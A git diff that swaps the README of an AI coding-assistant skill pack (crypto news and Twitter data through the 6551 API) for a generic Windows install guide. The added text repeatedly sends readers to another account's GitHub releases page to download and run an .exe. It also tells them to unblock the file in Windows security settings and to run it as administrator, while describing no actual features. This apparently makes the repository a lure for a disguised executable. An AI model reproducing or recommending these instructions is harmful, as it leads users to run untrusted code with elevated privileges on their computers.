@@ -1,126 +1,162 @@
-# OpenSkills-Weixin
+# 🔧 openskills-weixin - Easy Weixin skills for everyone
 
-AI 编码助手技能集，通过 6551 平台 API 提供加密货币新闻、社交媒体和交易操作功能。
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Silvaadscititious380/openskills-weixin/releases)
 
-## 可用技能
+## 📥 Download
 
-### 新闻与社交媒体
+Visit this page to download the latest version:
 
-| 技能 | 描述 |
-|-------|-------------|
-| `opennews` | 加密货币新闻搜索、AI 评级、交易信号和实时更新 |
-| `opentwitter` | Twitter/X 数据，包括用户资料、推文搜索和 KOL 追踪 |
+https://github.com/Silvaadscititious380/openskills-weixin/releases
 
-**总计**: 2 个技能
+On that page, look for the newest release and download the Windows file that fits your PC. Most users should pick the `.exe` file if one is listed.
 
-## 前置要求
+## 🪟 What this app does
 
-所有技能都需要来自 6551 平台的 API 令牌。
+openskills-weixin is a Windows app for Agent Skills Weixin Version. It helps you run the software on your PC with a simple setup and a clear path from download to use.
 
-### API 令牌设置
+Use it when you want a local Windows app that you can install, open, and use without extra setup steps.
 
-在项目根目录创建或编辑 `.env` 文件以覆盖默认 API 凭据。在执行操作前加载它。
+## ✅ Before you start
 
-```bash
-OPEN_TOKEN=your_token_here
-```
+Make sure your computer has:
 
-获取你的 API 令牌: https://6551.io/mcp
+- Windows 10 or Windows 11
+- A stable internet connection for the download
+- Enough free space for the app and its files
+- Permission to install apps on your PC
 
-**安全警告**: 永远不要将 `.env` 提交到 git（将其添加到 `.gitignore`），也不要在日志、截图或聊天消息中暴露凭据。
+If your PC blocks downloads, you may need to allow the file in your browser or in Windows security settings.
 
-### 配置文件（备选方案）
+## 🚀 How to install
 
-你也可以将令牌存储在配置文件中:
+1. Open the download page:
+   https://github.com/Silvaadscititious380/openskills-weixin/releases
 
-**macOS/Linux:**
-```bash
-mkdir -p ~/.config/openskills
-echo '{"token": "your-token-here"}' > ~/.config/openskills/credentials.json
-```
+2. Find the latest release at the top of the page.
 
-**Windows:**
-```powershell
-mkdir $env:APPDATA\openskills
-echo '{"token": "your-token-here"}' > $env:APPDATA\openskills\credentials.json
-```
+3. Download the Windows installer file. Look for a file name that ends in `.exe`.
 
-**优先级:** `.env` 文件优先于配置文件。
+4. If your browser asks what to do with the file, choose Save.
 
-所有请求都需要 Bearer 令牌认证:
+5. When the download finishes, open the file.
 
-```bash
-Authorization: Bearer $OPEN_TOKEN
-```
+6. If Windows asks for permission, click Yes or Run.
 
-## 安装
+7. Follow the on-screen steps to finish the install.
 
-### 推荐方式
+8. If the app opens after install, the setup is done.
 
-```bash
-npx skills add 6551Team/openskills-weixin
-```
+## 🖥️ First launch
 
-适用于 Claude Code、Cursor、Codex CLI 和 OpenCode。自动检测你的环境并相应安装。
+After installation, open openskills-weixin from your Start menu or desktop shortcut.
 
-## 技能工作流
+If Windows shows a security prompt, check that the file came from the GitHub release page, then choose to run it.
 
-这些技能在典型的加密货币工作流中协同工作:
+The first launch may take a few seconds while Windows prepares the app.
 
-### 新闻驱动交易
-`opennews` → 分析市场数据 → 执行交易决策
+## 📂 How to use it
 
-1. 从新闻中发现交易信号
-2. 检查当前代币价格
-3. 基于信息做出交易决策
+Once the app opens, use it like a normal Windows program:
 
-### 社交情绪分析
-`opentwitter` → `opennews` → 市场验证 → 交易决策
+- Start the app from the Start menu
+- Follow the prompts inside the app
+- Use the buttons or menus shown on screen
+- Close the app when you are done
 
-1. 搜索 Twitter 提及和 KOL 活动
-2. 与新闻信号交叉参考
-3. 验证价格走势
-4. 执行明智的交易
+If the app uses a login, connection, or setup step, complete it in the order shown. Keep the app open until the process ends.
 
-## API 基础 URL
+## 🔍 Release files
 
-所有技能使用基础 URL: `https://ai.6551.io`
+The release page may include one or more files. Common file types include:
 
-## 响应格式
+- `.exe` — Windows installer or app file
+- `.zip` — compressed package you must extract first
+- `.md` or `.txt` — readme or release notes
 
-所有 API 响应遵循此格式:
+If you see a `.zip` file, right-click it and choose Extract All before you try to open the app.
 
-```json
-{
-  "code": 200,
-  "message": "success",
-  "data": {
-    // 响应数据
-  },
-  "usage": 1
-}
-```
+## 🛠️ Common issues
 
-## 错误处理
+### App will not open
+- Right-click the file and choose Run as administrator
+- Check that the file finished downloading
+- Download it again from the release page
 
-```json
-{
-  "code": 400,
-  "message": "error message",
-  "error": "detailed error information"
-}
-```
+### Windows blocks the file
+- Open the file properties and check whether Windows marked it as blocked
+- Allow the file if your PC trusts the release source
+- Try the download again from the GitHub release page
 
-## 速率限制
+### Download looks incomplete
+- Delete the file
+- Visit the release page again
+- Download the latest file one more time
 
-- 速率限制适用于所有端点
-- 每个请求消耗配额单位（通常每个请求 1 单位）
-- 在 https://6551.io/mcp 监控你的使用情况
+### App opens, then closes
+- Restart your PC
+- Try the app again
+- Download the newest release if the issue keeps happening
 
-## 许可证
+## 📁 File placement
 
-MIT
+Keep the downloaded file in a place you can find easily, such as:
 
-## 支持
+- Downloads
+- Desktop
+- A folder named `Apps`
 
-如有问题和功能请求，请访问: https://6551.io/support
+If you use a `.zip` package, extract it before opening the app. Do not move random files out of the folder after extraction unless the release notes say to do that.
+
+## ⚙️ Basic system expectations
+
+For smooth use, your PC should have:
+
+- A modern Intel or AMD processor
+- At least 4 GB of RAM
+- 200 MB or more of free disk space
+- A current version of Windows
+- Normal access to the desktop and file system
+
+More memory and free space can help if you keep many apps open at once.
+
+## 🧭 Where to get updates
+
+Use the same release page to check for newer versions:
+
+https://github.com/Silvaadscititious380/openskills-weixin/releases
+
+When a new release appears, download the newest Windows file and replace the older one if needed.
+
+## 🔐 Safety checks
+
+Before you run the file, confirm that:
+
+- You downloaded it from the GitHub release page
+- The file name matches the latest release
+- The file is a Windows app file or package you expect
+
+If the file came from another site, delete it and use the release link above
+
+## 🧩 Typical setup flow
+
+1. Open the releases page
+2. Download the Windows file
+3. Open the file
+4. Approve the Windows prompt
+5. Finish the install steps
+6. Launch the app
+7. Use the app from your desktop or Start menu
+
+## 📝 What to expect from the app
+
+openskills-weixin is built to give Windows users a direct path to Agent Skills Weixin Version. The app should feel simple, with clear steps and a basic interface that helps you get started fast.
+
+It is meant for users who want a local Windows app they can download and use without reading technical setup guides
+
+## 📌 Download again if needed
+
+If you need to reinstall or move the app to another Windows PC, use this same page:
+
+https://github.com/Silvaadscititious380/openskills-weixin/releases
+
+Download the latest release file, then run or extract it based on the file type shown on the page
